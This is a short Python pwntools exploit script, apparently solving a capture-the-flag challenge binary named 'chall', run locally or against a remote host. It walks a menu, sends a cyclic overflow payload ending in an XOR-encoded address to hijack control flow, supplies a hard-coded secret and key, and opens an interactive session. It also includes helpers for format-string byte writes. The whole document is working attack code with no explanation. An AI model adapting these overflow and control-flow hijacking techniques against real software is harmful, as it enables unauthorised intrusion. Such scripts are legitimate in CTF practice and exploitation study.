#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]

encode = lambda e: e if type(e) == bytes else str(e).encode()
hexleak = lambda l: int(l[:-1] if l[-1] == '\n' else l, 16)
fixleak = lambda l: unpack(l[:-1].ljust(8, b"\x00"))
func_byte_array_hhn = lambda func_addr: [(func_addr >> (8 * i)) & 0xFF for i in range((func_addr.bit_length() + 7) // 8)]
diff_byte=lambda i,j:((i-j)%256)
context.log_level='error'
exe = "./chall"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])
    ) if args.REMOTE else process(argv=[exe], aslr=False)
if args.GDB: gdb.attach(io, """
    b *print_arena+321
""")
io.sendlineafter(b'Choice: ',b'1')
io.sendlineafter(b'(0-2): ',b'0')
io.sendlineafter(b'Choice: ',b'2')
io.sendlineafter(b'(0-2): ',b'0')
payload=cyclic(0x40) + pack(0x000000000012d591^0x0000000000401206)
io.sendline(payload)
io.sendlineafter(b'Choice: ',b'4')
io.sendlineafter(b'(0-2): ',b'0')
io.sendlineafter(b'secret: ',b'44504')
io.sendlineafter(b'key: ',b'7201')
io.interactive()
